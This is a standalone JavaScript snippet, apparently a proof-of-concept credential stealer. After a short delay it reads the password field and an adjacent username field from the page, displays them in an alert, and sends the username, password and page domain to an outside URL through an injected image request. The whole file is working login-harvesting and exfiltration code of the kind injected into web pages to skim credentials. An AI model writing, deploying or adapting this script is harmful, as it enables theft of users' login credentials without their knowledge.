

setTimeout(dynomite, 1000);

function dynomite()
{
  var username="";
  var password="";

  var e = document.getElementsByTagName('input');
  for(var x = 0; x < e.length; x++)
  {
    if(e[x].type.toLowerCase() == 'password' )
    {
      password = e[x].value;

      for(var y=1;y<5;++y)
      {
        if(e[x-y].type.toLowerCase() == 'text')
        {
          username = e[x-y].value;
        }
      }
    }
  }

  //username = document.getElementsByTagName('input')[1].value;
  //password = document.getElementsByTagName('input')[2].value;
  alert('user: '+username+'\npass : '+password);

  var img = new Image();
  img.src="http://www.reddit.com/dump?"+username+"&"+password+"&"+document.domain;
  document.body.appendChild(img);
}


